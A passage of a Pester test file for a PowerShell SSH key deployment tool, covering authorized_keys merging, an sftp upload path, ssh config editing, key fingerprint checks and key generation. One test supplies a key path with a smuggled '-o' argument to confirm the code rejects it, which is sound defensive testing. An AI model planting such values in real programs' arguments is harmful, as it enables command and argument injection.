                -PublicKey @('ssh-ed25519 NEW a@b')

            $merge.KeysAdded | Should-Be 0
            $merge.Content | Should-Be $existing
        }

        It 'matches an existing entry that carries a stray carriage return' {
            # The same CR-tainted duplicate the exec path normalizes before comparing
            $merge = Merge-AuthorizedKeyContent -ExistingContent "ssh-ed25519 NEW a@b`r`n" `
                -PublicKey @('ssh-ed25519 NEW a@b')

            $merge.KeysAdded | Should-Be 0
        }

        It 'writes LF endings, because sshd reads this file' {
            $merge = Merge-AuthorizedKeyContent -ExistingContent "ssh-rsa OLD admin@old`r`n" `
                -PublicKey @('ssh-ed25519 NEW a@b')

            $merge.Content | Should-NotMatchString "`r"
        }

        It 'adds several keys in one pass and counts only the new ones' {
            $merge = Merge-AuthorizedKeyContent -ExistingContent "ssh-ed25519 ONE a@b`n" -PublicKey @(
                'ssh-ed25519 ONE a@b'
                'ssh-ed25519 TWO c@d'
                'ssh-ed25519 THREE e@f'
            )

            $merge.KeysAdded | Should-Be 2
            @($merge.Content -split "`n" | Where-Object { $_ }) | Should-BeCollection -Count 3
        }

        It 'does not accumulate blank lines across repeated runs' {
            $first = Merge-AuthorizedKeyContent -ExistingContent "ssh-ed25519 ONE a@b`n`n`n" `
                -PublicKey @('ssh-ed25519 TWO c@d')
            $second = Merge-AuthorizedKeyContent -ExistingContent $first.Content `
                -PublicKey @('ssh-ed25519 TWO c@d')

            $second.Content | Should-Be $first.Content
            $first.Content | Should-NotMatchString "`n`n"
        }
    }
}


Describe 'Install-PublicKeySftp' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Host {}
        Mock Write-Note {}

        # Stands in for sftp.exe: records the arguments of every session it is given
        $script:sftpDir = Join-Path $TestDrive 'sftpstub'
        New-Item -ItemType Directory -Path $script:sftpDir -Force | Out-Null
        $script:sftpCapture = Join-Path $script:sftpDir 'args.txt'
        $script:sftpStub = Join-Path $script:sftpDir 'sftp.ps1'
        @'
Add-Content -Path $env:DEPLOYSSHKEY_SFTP_CAPTURE -Value ($args -join ' ')
# Record the batch contents too, so tests can assert on the command order sftp is given
$batchIndex = [array]::IndexOf($args, '-b')
if ($batchIndex -ge 0 -and (Test-Path $args[$batchIndex + 1])) {
    Add-Content -Path $env:DEPLOYSSHKEY_SFTP_CAPTURE -Value (
        '--batch--' + ((Get-Content $args[$batchIndex + 1]) -join ' ; '))
}
'@ | Set-Content $script:sftpStub -Encoding ascii
    }

    BeforeEach {
        $env:DEPLOYSSHKEY_SFTP_CAPTURE = $script:sftpCapture
        Remove-Item $script:sftpCapture -Force -ErrorAction SilentlyContinue
        New-Item -ItemType File -Path $script:sftpCapture -Force | Out-Null
    }

    AfterAll {
        Remove-Item Env:\DEPLOYSSHKEY_SFTP_CAPTURE -ErrorAction SilentlyContinue
    }

    Context 'Core Functionality' {

        It 'turns BatchMode off, which -b would otherwise force on' {
            # sftp enables BatchMode whenever -b is used, and BatchMode disables password
            # prompts - making it impossible to install a key on a host that needs one,
            # which is the entire purpose of this path
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22')

            $captured = Get-Content $script:sftpCapture -Raw

            $captured | Should-MatchString ([regex]::Escape('-o BatchMode=no'))
        }

        It 'converts the port switch for sftp' {
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '2222')

            (Get-Content $script:sftpCapture -Raw) | Should-MatchString '-P 2222'
        }

        It 'traces the transfer when asked, since there is no remote script to trace' {
            # ssh-copy-id -x has no direct analogue here: this path sends a file, not a body
            # that could be put under set -x. sftp's own -v answers the same question.
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22') -Trace

            (Get-Content $script:sftpCapture | Select-Object -First 1) |
                Should-MatchString '^-v '
        }

        It 'sends no -v when tracing was not asked for' {
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22')

            (Get-Content $script:sftpCapture -Raw) | Should-NotMatchString '(^|\s)-v(\s|$)'
        }

        It 'uses two sessions, because a batch cannot pause for the local merge' {
            # The conflict checks are folded into the existing batches rather than added as
            # extra sessions, so this count must not grow when they are present
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22')

            @(Get-Content $script:sftpCapture | Where-Object { $_ -and $_ -notmatch '^--batch--' }) |
                Should-BeCollection -Count 2
        }

        It 'reads the file back immediately before overwriting it' {
            # sftp runs batch commands in order, so a get placed just before the put captures
            # the file as it stood at that instant. Comparing it with the first read is the
            # only way to notice a change made inside the read-modify-write window - by
            # another run, or by a person with an editor open. Without it, their content is
            # destroyed silently and this run still reports success.
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22')

            $batch = (Get-Content $script:sftpCapture | Where-Object { $_ -match '^--batch--' })[-1]
            $getBefore = $batch.IndexOf('-get')
            $put = $batch.IndexOf('put ')

            $getBefore | Should-BeGreaterThan -1
            $put | Should-BeGreaterThan $getBefore `
                -Because 'the pre-upload read must happen before the overwrite'
        }

        It 'reads the file back after writing it' {
            # Catches the case where a third writer replaced the file between our put and
            # now - a run that would otherwise report a key it no longer owns
            $null = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22')

            $batch = (Get-Content $script:sftpCapture | Where-Object { $_ -match '^--batch--' })[-1]

            $batch | Should-MatchString 'put .*-get' `
                -Because 'a read must follow the write to confirm the key survived'
        }

        It 'reports the remote path it targeted' {
            $result = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22') `
                -RemotePath '/etc/ssh/keys/jeff'

            $result.KeyFile | Should-Be '/etc/ssh/keys/jeff'
        }
    }

    Context 'ShouldProcess support' {

        It 'opens no session under -WhatIf' {
            $result = Install-PublicKeySftp -SftpPath $script:sftpStub -Target 'root@host' `
                -PublicKey @('ssh-ed25519 AAAA a@b') -CommonArgs @('-p', '22') -WhatIf

            $result.Attempted | Should-BeFalse
            @(Get-Content $script:sftpCapture | Where-Object { $_ }) | Should-BeCollection -Count 0
        }
    }
}


Describe 'ConvertTo-SftpArgument' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'translates the port switch, which sftp spells in upper case' {
            # sftp reads lower-case -p as "preserve modification times", so the port would be
            # dropped and the connection would silently go to 22
            $converted = ConvertTo-SftpArgument -SshArgument @('-p', '2222', '-i', 'C:\k')

            $converted[0] | Should-Be '-P'
            $converted[1] | Should-Be '2222'
        }

        It 'leaves other arguments untouched' {
            $converted = ConvertTo-SftpArgument -SshArgument @('-o', 'StrictHostKeyChecking=yes', '-i', 'C:\k')

            $converted | Should-ContainCollection @('StrictHostKeyChecking=yes')
            $converted | Should-ContainCollection @('-i')
        }

        It 'does not mistake an option value for the port switch' {
            $converted = ConvertTo-SftpArgument -SshArgument @('-o', 'ProxyCommand=nc -p 1080 %h %p')

            $converted | Should-ContainCollection @('ProxyCommand=nc -p 1080 %h %p')
            $converted | Should-NotContainCollection @('-P')
        }
    }
}


Describe 'Write-RemediationHint' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'points a POSIX failure at file permissions and SELinux' {
            Mock Write-Host {}

            Write-RemediationHint -Platform 'Linux'

            Should-Invoke Write-Host -ParameterFilter { $Object -match 'SELinux' }
        }

        It 'points a Windows failure at administrators_authorized_keys' {
            Mock Write-Host {}

            Write-RemediationHint -Platform 'Windows'

            Should-Invoke Write-Host -ParameterFilter { $Object -match 'administrators_authorized_keys' }
            Should-Invoke Write-Host -ParameterFilter { $Object -match 'WindowsKeyLocation UserProfile' }
        }
    }
}


Describe 'Format-SshConfigBlock' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'emits User, Port and IdentityFile without HostName by default' {
            $block = Format-SshConfigBlock -HostPattern 'host1' -HostAddress 'host1' -User 'root' `
                -KeyPath 'C:\keys\id_ed25519' -Port 22

            $block[0] | Should-Be 'Host host1'
            $block | Should-ContainCollection @('    User root')
            $block | Should-ContainCollection @('    Port 22')
            $block | Should-ContainCollection @('    IdentityFile C:\keys\id_ed25519')
            ($block -join "`n") | Should-NotMatchString 'HostName'
        }

        It 'adds HostName when an alias pattern is used' {
            $block = Format-SshConfigBlock -HostPattern 'pve 10.0.0.5' -HostAddress '10.0.0.5' `
                -User 'root' -KeyPath 'C:\keys\id' -Port 22 -IncludeHostName

            $block[0] | Should-Be 'Host pve 10.0.0.5'
            $block | Should-ContainCollection @('    HostName 10.0.0.5')
        }

        It 'carries a non-default port through' {
            $block = Format-SshConfigBlock -HostPattern 'h' -HostAddress 'h' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 2222

            $block | Should-ContainCollection @('    Port 2222')
        }

        It 'quotes an IdentityFile path containing spaces' {
            $block = Format-SshConfigBlock -HostPattern 'h' -HostAddress 'h' -User 'root' `
                -KeyPath 'C:\my keys\id_ed25519' -Port 22

            $block | Should-ContainCollection @('    IdentityFile "C:\my keys\id_ed25519"')
        }
    }
}


Describe 'Find-SshConfigBlock' -Tag 'Unit' {

    BeforeAll {
        $script:sampleConfig = @(
            '# leading comment'
            'Host pve 192.168.66.23'
            '    User root'
            '    Port 22'
            ''
            'Host github.com'
            '    User git'
        )
    }

    Context 'Core Functionality' {

        It 'finds a block by host address' {
            $match = Find-SshConfigBlock -Line $script:sampleConfig -Token @('192.168.66.23')

            $match | Should-NotBeNull
            $match.StartIndex | Should-Be 1
        }

        It 'finds the same block by alias' {
            $match = Find-SshConfigBlock -Line $script:sampleConfig -Token @('pve')

            $match.StartIndex | Should-Be 1
        }

        It 'ends before the next Host keyword, excluding blank separators' {
            $match = Find-SshConfigBlock -Line $script:sampleConfig -Token @('pve')

            # Last content line is '    Port 22' at index 3; the blank line must not be consumed
            $match.EndIndex | Should-Be 3
        }

        It 'treats a Match keyword as a boundary' {
            $lines = @('Host h1', '    User a', 'Match host h2', '    User b')

            $match = Find-SshConfigBlock -Line $lines -Token @('h1')

            $match.EndIndex | Should-Be 1
        }

        It 'extends to the end of file for a trailing block' {
            $lines = @('Host h1', '    User a', '    Port 22')

            $match = Find-SshConfigBlock -Line $lines -Token @('h1')

            $match.EndIndex | Should-Be 2
        }
    }

    Context 'Error Handling' {

        It 'returns nothing when the host is absent' {
            $match = Find-SshConfigBlock -Line $script:sampleConfig -Token @('other.host')

            $match | Should-BeNull
        }

        It 'handles an empty config' {
            $match = Find-SshConfigBlock -Line @() -Token @('anything')

            $match | Should-BeNull
        }
    }
}


Describe 'Update-SshConfigEntry' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Ok {}
        Mock Write-Note {}
        Mock Write-Bad {}

        # Update-SshConfigEntry echoes the conflicting block with Write-Host directly
        Mock Write-Host {}
    }

    Context 'Core Functionality' {

        It 'creates the config file when it does not exist' {
            $cfg = Join-Path $TestDrive 'new\config'

            $result = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22

            $result | Should-BeTrue
            Test-Path $cfg | Should-BeTrue
            (Get-Content $cfg) | Should-ContainCollection @('Host 10.0.0.5')
        }

        It 'writes LF line endings only' {
            $cfg = Join-Path $TestDrive 'lf\config'

            $null = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22

            (Get-Content $cfg -Raw) | Should-NotMatchString "`r" -Because 'ssh config must stay LF'
        }

        It 'appends without disturbing unrelated blocks' {
            $cfg = Join-Path $TestDrive 'append\config'
            New-Item -ItemType Directory -Path (Split-Path $cfg -Parent) -Force | Out-Null
            Set-Content $cfg @('Host github.com', '    User git') -Encoding ascii

            $null = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22

            $content = Get-Content $cfg
            $content | Should-ContainCollection @('Host github.com')
            $content | Should-ContainCollection @('    User git')
            $content | Should-ContainCollection @('Host 10.0.0.5')
        }
    }

    Context 'Conflict handling' {

        It 'leaves a conflicting block alone when confirmation is unavailable' {
            $cfg = Join-Path $TestDrive 'conflict\config'
            New-Item -ItemType Directory -Path (Split-Path $cfg -Parent) -Force | Out-Null
            Set-Content $cfg @('Host 10.0.0.5', '    User olduser') -Encoding ascii

            # Pester runs non-interactively, so ShouldContinue cannot prompt and must deny
            $result = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22

            $result | Should-BeFalse
            (Get-Content $cfg) | Should-ContainCollection @('    User olduser')
        }

        It 'replaces a conflicting block with -Force and preserves surrounding content' {
            $cfg = Join-Path $TestDrive 'force\config'
            New-Item -ItemType Directory -Path (Split-Path $cfg -Parent) -Force | Out-Null
            Set-Content $cfg @(
                '# my notes'
                'Host pve 10.0.0.5'
                '    User olduser'
                '    Port 2222'
                ''
                'Host github.com'
                '    User git'
            ) -Encoding ascii

            $result = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22 -Alias 'pve' -Force

            $result | Should-BeTrue
            $content = Get-Content $cfg
            $content[0] | Should-Be '# my notes'
            $content | Should-ContainCollection @('    User root')
            $content | Should-NotContainCollection @('    User olduser')
            $content | Should-ContainCollection @('Host github.com')
            $content | Should-ContainCollection @('    User git')
        }

        It 'keeps the existing entry when the overwrite is declined' {
            $cfg = Join-Path $TestDrive 'declined\config'
            New-Item -ItemType Directory -Path (Split-Path $cfg -Parent) -Force | Out-Null
            Set-Content $cfg @('Host 10.0.0.5', '    User olduser') -Encoding ascii

            # A standing "No to All" makes ShouldContinue answer without prompting
            $script:SshConfigNoToAll = $true
            try {
                $result = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' `
                    -User 'root' -KeyPath 'C:\keys\id' -Port 22

                $result | Should-BeFalse
                Should-Invoke Write-Note -ParameterFilter { $Message -match 'Kept the existing entry' }
                (Get-Content $cfg) | Should-ContainCollection @('    User olduser')
            }
            finally {
                $script:SshConfigNoToAll = $false
            }
        }
    }

    Context 'ShouldProcess support' {

        It 'makes no change under -WhatIf' {
            $cfg = Join-Path $TestDrive 'whatif\config'
            New-Item -ItemType Directory -Path (Split-Path $cfg -Parent) -Force | Out-Null
            Set-Content $cfg @('Host 10.0.0.5', '    User olduser') -Encoding ascii
            $before = (Get-FileHash $cfg).Hash

            $null = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22 -Force -WhatIf

            (Get-FileHash $cfg).Hash | Should-Be $before
        }

        It 'creates no file under -WhatIf when the entry is new' {
            $cfg = Join-Path $TestDrive 'wi-new\config'

            $result = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.9' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22 -WhatIf

            $result | Should-BeFalse
            Test-Path $cfg | Should-BeFalse
        }
    }
}


Describe 'SSH invocation' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Ok {}
        Mock Write-Note {}

        # A stub standing in for ssh.exe. Test-PasswordlessAccess and Install-PublicKey both
        # invoke ssh through a path variable, so a stub path exercises the real code paths
        # without any network traffic.
        $script:stubDir = Join-Path $TestDrive 'stub'
        New-Item -ItemType Directory -Path $script:stubDir -Force | Out-Null

        $script:capturePath = Join-Path $script:stubDir 'capture.xml'

        $script:sshOk = Join-Path $script:stubDir 'ssh-ok.ps1'
        @'
$stdin = @($input)
[pscustomobject]@{ Args = $args; Stdin = $stdin } |
    Export-Clixml -Path $env:DEPLOYSSHKEY_STUB_CAPTURE
'AUTH_OK'
'@ | Set-Content $script:sshOk -Encoding ascii

        $script:sshDenied = Join-Path $script:stubDir 'ssh-denied.ps1'
        @'
'Permission denied'
'@ | Set-Content $script:sshDenied -Encoding ascii
    }

    BeforeEach {
        $env:DEPLOYSSHKEY_STUB_CAPTURE = $script:capturePath
        if (Test-Path $script:capturePath) {
            Remove-Item $script:capturePath -Force
        }
    }

    AfterAll {
        Remove-Item Env:\DEPLOYSSHKEY_STUB_CAPTURE -ErrorAction SilentlyContinue
    }

    Context 'Test-PasswordlessAccess' {

        It 'reports success when the remote sentinel is returned' {
            $result = Test-PasswordlessAccess -SshPath $script:sshOk -Target 'root@host' `
                -CommonArgs @('-p', '22')

            $result | Should-BeTrue
        }

        It 'reports failure when the sentinel is absent' {
            $result = Test-PasswordlessAccess -SshPath $script:sshDenied -Target 'root@host' `
                -CommonArgs @('-p', '22')

            $result | Should-BeFalse
        }

        It 'passes BatchMode so the probe can never prompt for a password' {
            $null = Test-PasswordlessAccess -SshPath $script:sshOk -Target 'root@host' `
                -CommonArgs @('-p', '22')

            $captured = Import-Clixml $script:capturePath

            ($captured.Args -join ' ') | Should-MatchString 'BatchMode=yes'
        }
    }

    Context 'Identifying which key was accepted' {

        BeforeAll {
            # IdentitiesOnly=yes does not stop an IdentityFile in ssh_config being offered
            # alongside -i, so a host trusting that other key answers "yes" to a question
            # about a key it has never seen. Only -v names the key actually accepted.
            $script:sshOtherKey = Join-Path $script:stubDir 'ssh-otherkey.ps1'
            @'
'debug1: Offering public key: mine ED25519 SHA256:MINEMINEMINE explicit'
'debug1: Server accepts key: theirs ED25519 SHA256:THEIRSTHEIRS explicit'
'AUTH_OK'
'@ | Set-Content $script:sshOtherKey -Encoding ascii

            $script:sshOurKey = Join-Path $script:stubDir 'ssh-ourkey.ps1'
            @'
'debug1: Server accepts key: mine ED25519 SHA256:MINEMINEMINE explicit'
'AUTH_OK'
'@ | Set-Content $script:sshOurKey -Encoding ascii

            # An account restricted to sftp authenticates but refuses to run the command
            $script:sshNoCommand = Join-Path $script:stubDir 'ssh-nocommand.ps1'
            @'
'debug1: Server accepts key: mine ED25519 SHA256:MINEMINEMINE explicit'
'This service allows sftp connections only.'
'@ | Set-Content $script:sshNoCommand -Encoding ascii
        }

        It 'reports success when the server accepted the key under test' {
            Test-PasswordlessAccess -SshPath $script:sshOurKey -Target 'root@host' `
                -CommonArgs @('-p', '22') -Fingerprint 'SHA256:MINEMINEMINE' | Should-BeTrue
        }

        It 'reports failure when the server accepted a different key' {
            # Without the fingerprint check this returns true, and the key the operator
            # asked to deploy is silently skipped
            Test-PasswordlessAccess -SshPath $script:sshOtherKey -Target 'root@host' `
                -CommonArgs @('-p', '22') -Fingerprint 'SHA256:MINEMINEMINE' | Should-BeFalse
        }

        It 'asks ssh to name the accepted key only when a fingerprint is supplied' {
            $null = Test-PasswordlessAccess -SshPath $script:sshOk -Target 'root@host' `
                -CommonArgs @('-p', '22')
            $captured = Import-Clixml $script:capturePath

            $captured.Args | Should-NotContainCollection @('-v') `
                -Because 'the plain probe should not pay for debug output it will not read'
        }

        It 'accepts key-only proof when the account cannot run a command' {
            # ForceCommand internal-sftp accounts never return the sentinel, so requiring it
            # would report a perfectly good key as failed
            Test-PasswordlessAccess -SshPath $script:sshNoCommand -Target 'sftponly@host' `
                -CommonArgs @('-p', '22') -Fingerprint 'SHA256:MINEMINEMINE' -KeyAuthOnly |
                Should-BeTrue
        }

        It 'still requires the sentinel when a command is expected to work' {
            Test-PasswordlessAccess -SshPath $script:sshNoCommand -Target 'root@host' `
                -CommonArgs @('-p', '22') -Fingerprint 'SHA256:MINEMINEMINE' | Should-BeFalse
        }
    }

    Context 'Get-PublicKeyFingerprint' {

        BeforeAll {
            $script:keygenFp = Join-Path $script:stubDir 'keygen-fp.ps1'
            Set-Content $script:keygenFp `
                "'256 SHA256:abc+DEF/123= test@ws (ED25519)'" -Encoding ascii
        }

        It 'extracts the hash ssh -v also prints' {
            Get-PublicKeyFingerprint -Path 'ignored' -SshKeygenPath $script:keygenFp |
                Should-Be 'SHA256:abc+DEF/123='
        }

        It 'returns empty rather than throwing when the key cannot be read' {
            $missing = Join-Path $TestDrive 'no-such-keygen.ps1'

            Get-PublicKeyFingerprint -Path 'ignored' -SshKeygenPath $missing | Should-Be ''
        }
    }

    Context 'Install-PublicKey' {

        It 'pipes nothing, on either platform' {
            # Windows PowerShell 5.1 prepends a UTF-8 BOM to anything piped into a native
            # command, so a key sent on stdin arrived as "<BOM>ssh-ed25519 ..." and could
            # never match. Both platform commands now embed their keys instead.
            $null = Install-PublicKey -SshPath $script:sshOk -Target 'admin@fs01' `
                -RemoteCommand 'powershell -EncodedCommand AAAA' -CommonArgs @('-p', '22')

            $captured = Import-Clixml $script:capturePath

            Should-BeCollection -Actual @($captured.Stdin) -Count 0 `
                -Because 'nothing may travel on stdin, where 5.1 would corrupt it'
            $captured.Args | Should-ContainCollection @('powershell -EncodedCommand AAAA')
        }

        It 'passes the target and remote command as arguments' {
            $null = Install-PublicKey -SshPath $script:sshOk -Target 'root@host' `
                -RemoteCommand 'REMOTE_MARKER' -CommonArgs @('-p', '22')

            $captured = Import-Clixml $script:capturePath

            $captured.Args | Should-ContainCollection @('root@host')
            $captured.Args | Should-ContainCollection @('REMOTE_MARKER')
        }
    }

    Context 'Reporting what the session did' {

        BeforeAll {
            # The remote scripts emit these markers; nothing used to read them, so a failed
            # password and a rejected install produced identical output
            $script:sshMarkers = Join-Path $script:stubDir 'ssh-markers.ps1'
            @'
'KEY_FILE=/home/root/.ssh/authorized_keys'
'ACL_WARNING=C:\ProgramData\ssh\administrators_authorized_keys'
'KEY_INSTALLED_OK'
'@ | Set-Content $script:sshMarkers -Encoding ascii
        }

        It 'reports the file the host says received the key' {
            Mock Write-Host {}

            $result = Install-PublicKey -SshPath $script:sshMarkers -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22')

            $result.KeyFile | Should-Be '/home/root/.ssh/authorized_keys'
        }

        It 'reports the remote confirmation sentinel' {
            Mock Write-Host {}

            $result = Install-PublicKey -SshPath $script:sshMarkers -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22')

            $result.Reported | Should-BeTrue
            $result.Attempted | Should-BeTrue
        }

        It 'surfaces a remote ACL warning instead of discarding it' {
            Mock Write-Host {}
            Mock Write-Note {}

            $result = Install-PublicKey -SshPath $script:sshMarkers -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22')

            @($result.Warning) | Should-BeCollection -Count 1
            Should-Invoke Write-Note -ParameterFilter { $Message -match 'ACL could not be tightened' }
        }

        It 'shows diagnostic output the operator needs to see' {
            Mock Write-Host {}

            $null = Install-PublicKey -SshPath $script:sshDenied -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22')

            Should-Invoke Write-Host -ParameterFilter { $Object -match 'Permission denied' }
        }

        It 'reports no confirmation when the host never sends one' {
            Mock Write-Host {}

            $result = Install-PublicKey -SshPath $script:sshDenied -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22')

            $result.Reported | Should-BeFalse
            $result.KeyFile | Should-Be ''
        }
    }

    Context 'ShouldProcess support' {

        It 'does not contact the host under -WhatIf' {
            $null = Install-PublicKey -SshPath $script:sshOk -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22') -WhatIf

            Test-Path $script:capturePath | Should-BeFalse
        }

        It 'reports that nothing was attempted under -WhatIf' {
            $result = Install-PublicKey -SshPath $script:sshOk -Target 'root@host' `
                -RemoteCommand 'cmd' -CommonArgs @('-p', '22') -WhatIf

            $result.Attempted | Should-BeFalse
        }
    }
}


Describe 'Initialize-KeyPair' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Ok {}
        Mock Write-Note {}
    }

    Context 'Core Functionality' {

        It 'reuses an existing key without regenerating it' {
            $keyPath = Join-Path $TestDrive 'existing\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'PRIVATE' -Encoding ascii
            Set-Content "$keyPath.pub" 'PUBLIC' -Encoding ascii

            $result = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'c' `
                -SshKeygenPath 'unused-because-key-exists'

            $result | Should-Be "$keyPath.pub"
            (Get-Content $keyPath) | Should-Be 'PRIVATE'
        }

        It 'derives a missing public key from the private key' {
            $keyPath = Join-Path $TestDrive 'derive\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'PRIVATE' -Encoding ascii

            $keygenStub = Join-Path $TestDrive 'derive\keygen.ps1'
            Set-Content $keygenStub "'ssh-ed25519 DERIVEDKEY'" -Encoding ascii

            $result = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'c' `
                -SshKeygenPath $keygenStub

            (Get-Content $result) | Should-ContainCollection @('ssh-ed25519 DERIVEDKEY')
        }

        It 'generates a passphrase-less key pair' -Skip:$script:SkipWithoutKeygen {
            $keyPath = Join-Path $TestDrive 'generate\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null

            $result = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'test@ws' `
                -SshKeygenPath (Get-Command ssh-keygen).Source

            # Regression guard: Start-Process drops an empty ArgumentList element, which made
            # -N '' collapse into -N -C and ssh-keygen fail with "Too many arguments."
            Test-Path $keyPath | Should-BeTrue -Because 'key generation must succeed'
            Test-Path $result | Should-BeTrue
            (Get-Content $result -Raw) | Should-MatchString 'test@ws'
        }

        It 'creates the .ssh directory when it does not exist' -Skip:$script:SkipWithoutKeygen {
            $keyPath = Join-Path $TestDrive 'brandnew\.ssh\id_ed25519'

            $null = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'test@ws' `
                -SshKeygenPath (Get-Command ssh-keygen).Source

            Test-Path $keyPath | Should-BeTrue
        }

        It 'replaces an existing key pair when -Force is supplied' -Skip:$script:SkipWithoutKeygen {
            $keyPath = Join-Path $TestDrive 'forcekey\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath 'STALE-PRIVATE' -Encoding ascii
            Set-Content "$keyPath.pub" 'STALE-PUBLIC' -Encoding ascii

            $result = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'test@ws' `
                -SshKeygenPath (Get-Command ssh-keygen).Source -Force

            (Get-Content $keyPath -Raw) | Should-NotMatchString 'STALE-PRIVATE'
            (Get-Content $result -Raw) | Should-MatchString 'test@ws'
        }

        It 'generates a 4096-bit key for the rsa type' -Skip:$script:SkipWithoutKeygen {
            $keyPath = Join-Path $TestDrive 'rsakey\id_rsa'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null

            $result = Initialize-KeyPair -KeyPath $keyPath -KeyType 'rsa' -Comment 'test@ws' `
                -SshKeygenPath (Get-Command ssh-keygen).Source

            (& ssh-keygen -lf $result) | Should-MatchString '^4096 '
        }
    }

    Context 'Refusing to invent an identity' {

        It 'refuses to generate when -RequireExistingKey is set' {
            # ssh-copy-id fails with "No identities found" rather than minting a key. Without
            # this, a mistyped -KeyPath silently deploys a brand new identity and reports success
            $keyPath = Join-Path $TestDrive 'require\id_ed25519'

            { Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'c' `
                    -SshKeygenPath 'should-not-run' -RequireExistingKey } |
                Should-Throw -ExceptionMessage '*RequireExistingKey*'
        }

        It 'refuses to overwrite an orphaned public key' {
            # ssh-keygen only checks the private key before writing, so it would clobber this
            # without a word. The private half legitimately lives in an agent or on a token.
            $keyPath = Join-Path $TestDrive 'orphan\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content "$keyPath.pub" 'ssh-ed25519 AAAAIRREPLACEABLE jeff@ws' -Encoding ascii

            Mock Write-Bad {}
            Mock Write-Host {}

            { Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'c' `
                    -SshKeygenPath 'should-not-run' } |
                Should-Throw -ExceptionMessage '*Refusing to overwrite*'

            (Get-Content "$keyPath.pub") | Should-ContainCollection @('ssh-ed25519 AAAAIRREPLACEABLE jeff@ws')
        }

        It 'rejects a key path that could break out of the ssh-keygen argument string' {
            # -Comment is allowlist-validated for this reason; KeyPath reaches the same
            # pre-quoted string and needs the same guarantee
            { Initialize-KeyPair -KeyPath 'C:\keys\bad" -o evil' -KeyType 'ed25519' -Comment 'c' `
                    -SshKeygenPath 'should-not-run' } |
                Should-Throw -ExceptionMessage '*double quote*'
        }
    }

    Context 'Error Handling' {

        It 'terminates when ssh-keygen reports a non-zero exit code' {
            $keyPath = Join-Path $TestDrive 'failkey\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            $stub = Join-Path $TestDrive 'failkey\keygen.cmd'
            Set-Content $stub "@echo off`r`nexit /b 3" -Encoding ascii

            { Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'c' `
                    -SshKeygenPath $stub } | Should-Throw -ExceptionMessage '*Key generation failed*'
        }

        It 'falls back to the profile directory when the key path has no parent' {
            Push-Location $TestDrive
            try {
